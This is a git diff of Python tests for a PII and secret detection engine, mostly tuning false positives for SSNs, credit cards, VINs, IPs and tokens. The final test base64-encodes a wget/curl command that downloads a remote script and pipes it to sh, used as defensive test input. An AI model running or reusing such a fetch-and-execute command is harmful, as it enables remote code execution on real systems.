@@ -1,8 +1,12 @@
 from src.engine.detector import DetectionEngine
 from src.engine.entropy import calculate_entropy
 from src.engine.layers import (
-    scan_credentials, scan_entropy, scan_financial,
-    scan_healthcare, scan_pii, scan_regional,
+    scan_credentials,
+    scan_entropy,
+    scan_financial,
+    scan_healthcare,
+    scan_pii,
+    scan_regional,
 )
 from src.engine.luhn import luhn_check
 
@@ -92,17 +96,24 @@ def test_scan_healthcare():
 
 
 def test_scan_regional():
-    text = "SSN is 000-12-3456. Aadhaar number is 9000 1234 5678. PAN: ABCDE1234F. SIN: 123-456-789. NINO: GG123456C."
+    # The upstream-ported rules ship their own valid examples; each must be found
+    # through the regional layer with its pack enabled, and not without it
+    from src.engine.recognizers import get_rule
 
-    # Active all regions
-    findings = scan_regional(text, ["US", "IN", "CA", "GB"])
-    detectors = [f["detector"] for f in findings]
+    for name, region, context in [
+        ("US SSN", "US", "SSN"), ("IN Aadhaar", "IN", "Aadhaar number"), ("IN PAN", "IN", "PAN"),
+        ("CA SIN", "CA", "SIN"), ("GB NINO", "GB", "NINO"),
+    ]:
+        rule = get_rule(name)
+        assert rule is not None and rule.examples, name
+        text = f"{context}: {rule.examples[0]}"
+        detectors = [f["detector"] for f in scan_regional(text, [region])]
+        assert name in detectors, (name, text, detectors)
+        assert name not in [f["detector"] for f in scan_regional(text, ["ZA"])], name
 
-    assert "US SSN" in detectors
-    assert "IN Aadhaar" in detectors
-    assert "IN PAN" in detectors
-    assert "CA SIN" in detectors
-    assert "GB NINO" in detectors
+    # invalid checksums / SSA-reserved areas never fire, whatever the context
+    invalid = "SSN is 000-12-3456, Aadhaar 9000 1234 5678, SIN 123-456-789"
+    assert scan_regional(invalid, ["US", "IN", "CA"]) == []
 
 
 def test_scan_entropy():
@@ -114,9 +125,96 @@ def test_scan_entropy():
     assert findings[0]["detector"] == "High Entropy Secret"
 
 
+def test_weak_check_digit_needs_context():
+    # VIN's ISO check digit is 1/11, so a 17-char reference passes it by chance. A validated match
+    # with no context/field stays `possible` (regression: FDR48131785579054, a doc reference, was
+    # reported very_likely). A real VIN reaches likely/very_likely via a field name or keyword.
+    from src.engine.recognizers import weak_validation_detectors
+
+    assert "VIN" in weak_validation_detectors()
+    engine = DetectionEngine()
+    assert engine.scan_text("FDR48131785579054") == []  # dropped at the default `likely` floor
+    assert [f["confidence"] for f in engine.scan_text("FDR48131785579054", min_confidence="possible")] == ["possible"]
+    assert [f["confidence"] for f in engine.scan_text("1HGCM82643C675372", field_name="vin")] == ["very_likely"]
+    assert "VIN" in [f["detector"] for f in engine.scan_text("chassis number 1HGCM82643C675372")]
+
+
+def test_large_base64_blob_scans_fast():
+    # Regression: a big base64 blob (a .drawio diagram is base64 XML) made EMAIL_REGEX backtrack
+    # O(n^2) - a 48 KB blob took ~4s, a 15 MB file hours. The bounded local part keeps it linear.
+    import base64
+    import os
+    import time
+
+    blob = base64.b64encode(os.urandom(200 * 1024)).decode()  # 200 KB, no '@'
+    start = time.time()
+    findings = DetectionEngine().scan_text(blob)
+    assert time.time() - start < 2.0, "email regex is backtracking on a long base64 run again"
+    assert not any(f["detector"] == "Email" for f in findings)
+    # real emails still detected
+    assert [f["detector"] for f in DetectionEngine().scan_text("reach me at john.doe@accuknox.com")] == ["Email"]
+
+
+def test_credential_assignment_ignores_code_expressions():
+    # A dotted member-expression on the RHS is source code, not a secret value
+    # (regression: ak-prompt-fw browser plugin reported apiKeyInput.value.trim as API Key).
+    for line in (
+        "const apiKey = apiKeyInput.value.trim();",
+        "apiKey: apiKeyInput.value",
+        "let x = config.apiKey.secret",
+        "const token = this.state.token",
+        "api_key = process.env.API_KEY",
+    ):
+        assert scan_credentials(line) == [], line
+    # a genuine assigned secret still fires
+    assert "API Key" in [f["detector"] for f in scan_credentials("api_key = aVeryLongRandomSecret0xDEADbeef99")]
+
+
+def test_detector_tuning():
+    # git SHA1 (40 lowercase hex) must not fire the AWS secret detector
+    findings = scan_credentials("commit: 3f786850e387550fdab836ed7e6dc881de23001b")
+    assert "AWS Secret Access Key" not in [f["detector"] for f in findings]
+    # a real base64-shaped AWS secret still fires (synthetic, random-shaped)
+    findings = scan_credentials('secret = "Zq8fW2kLm9Rt4Yx7Vb1Nc6Hs3Pj5Dg0Ka8Ue2Wo4"')
+    assert "AWS Secret Access Key" in [f["detector"] for f in findings]
+    # the pair AWS publishes in its documentation is never a real credential
+    engine = DetectionEngine()
+    assert engine.scan_text("AKIAIOSFODNN7EXAMPLE / wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY") == []
+
+    # cloud/machine 'state'/'city' fields are not addresses without a street word
+    findings = scan_pii('"state": "running", "region": "us-east-1", "az": "us-east-1a"')
+    assert "Address" not in [f["detector"] for f in findings]
+    # a real street line still fires
+    findings = scan_pii("Ships to 42 Baker Street, London")
+    assert "Address" in [f["detector"] for f in findings]
+
+    # operational timestamps are not birth dates
+    findings = scan_pii("updated_at: 2024-05-15 sla_due_date: 2023-01-02")
+    assert "Date of Birth" not in [f["detector"] for f in findings]
+    findings = scan_pii("date of birth: 1990-05-15")
+    dob = [f for f in findings if f["detector"] == "Date of Birth"]
+    assert dob and dob[0]["score"] > 0.8
+
+    # Luhn-passing digit runs without a card-network prefix are not credit cards
+    findings = scan_financial("trace ids 9988776655443325 and 1750000000009")
+    assert "Credit Card" not in [f["detector"] for f in findings]
+    findings = scan_financial("card: 4111-1111-1111-1111")
+    assert "Credit Card" in [f["detector"] for f in findings]
+
+    # a bare 'account' (AWS account ids everywhere in cloud data) is not bank context
+    findings = scan_financial("aws account: 123456789012 in region us-east-1")
+    assert "Bank Account" not in [f["detector"] for f in findings]
+    findings = scan_financial("bank account number: 9876543210")
+    assert "Bank Account" in [f["detector"] for f in findings]
+
+    # lowercase dns/slug names and short tokens are not entropy secrets
+    assert scan_entropy("pod: postgres-postgres-nvk9-0aa1bb2cc3") == []
+    assert scan_entropy("k: gP9x2K1mQ8zW0yL7aJ5s") == []  # 20 chars, below min_length 24
+
+
 def test_detection_engine():
     engine = DetectionEngine({"enabled_regions": ["US"]})
-    text = "My email is test@email.com and SSN is 123-45-6789."
+    text = "My email is test@email.com and SSN is 219-09-9999."
 
     findings = engine.scan_text(text)
     detectors = [f["detector"] for f in findings]
@@ -153,3 +251,45 @@ def test_new_updates_and_filters():
     text_fp = "The status is CERTIFICATE"
     findings_fp = engine.scan_text(text_fp)
     assert len(findings_fp) == 0
+
+
+def test_engine_policies_on_checksum_only_recognizers():
+    engine = DetectionEngine({"enabled_regions": ["US", "GB"]})
+    # a bare number that happens to pass a mod-10 / mod-11 checksum is not an id without context
+    assert engine.scan_text("1788242018", field_name="updated_time") == []
+    assert engine.scan_text("1234567893", field_name="misc") == []          # Luhn-valid NPI shape, no context
+    assert [f["detector"] for f in engine.scan_text("NPI: 1234567893", field_name="misc")] == ["US_NPI"]
+    assert [f["detector"] for f in engine.scan_text("1234567893", field_name="provider_npi")] == ["US_NPI"]
+    # epoch timestamps are never identifiers, even next to context
+    assert engine.scan_text("nhs 1785387766", field_name="notes") == []
+    # DEA-shaped hex prefixes in hash / image fields
+    assert engine.scan_text("dd3818412", field_name="hash_id") == []
+
+
+def test_private_ips_are_not_pii():
+    engine = DetectionEngine()
+    assert engine.scan_text("10.42.0.1", field_name="api_event.network.source.ip") == []
+    assert engine.scan_text("::ffff:10.42.0.24", field_name="body") == []
+    assert [f["detector"] for f in engine.scan_text("8.8.8.8", field_name="event.ip")] == ["PII.IPAddress"]
+    assert [f["detector"] for f in DetectionEngine({"report_private_ips": True}).scan_text("10.42.0.1", field_name="ip")] == ["PII.IPAddress"]
+
+
+def test_credential_fields_do_not_retype_pii_or_probes():
+    engine = DetectionEngine()
+    dets = [f["detector"] for f in engine.scan_text("carol.smith@yahoo.com", field_name="authorization")]
+    assert dets == ["Email"]
+    assert engine.scan_text("shop_session-id=x-liveness-probe", field_name="cookie") == []
+    assert [f["detector"] for f in engine.scan_text("af45916a-7c13-421c-9fc9-4a33ff2b1307", field_name="authorization")] == ["Bearer Token"]
+    # display names and single-token "names" are not person names
+    assert engine.scan_text("CRLF Injection", field_name="info.category.displayName") == []
+    assert engine.scan_text("mycard", field_name="cardholder_name") == []
+    assert [f["detector"] for f in engine.scan_text("Rahul", field_name="first_name")] == ["PII.PersonName"]
+
+
+def test_base64_text_is_not_a_token():
+    engine = DetectionEngine({"entropy_report_uncorroborated": True})
+    import base64
+    blob = base64.b64encode(b"(wget --no-check-certificate -qO- https://198.51.100.7/sh || curl -k https://198.51.100.7/sh) | sh").decode()
+    assert engine.scan_text(blob, field_name="api_event.http.request.body") == []
+    # a real random token is still reported when the flag is on
+    assert [f["detector"] for f in engine.scan_text("run id 3f9KqL2mXv8Rt5Yw1Zb7Nc4Hs6Pj0Dg", field_name="misc")] == ["Secret.TokenLikeValue"]
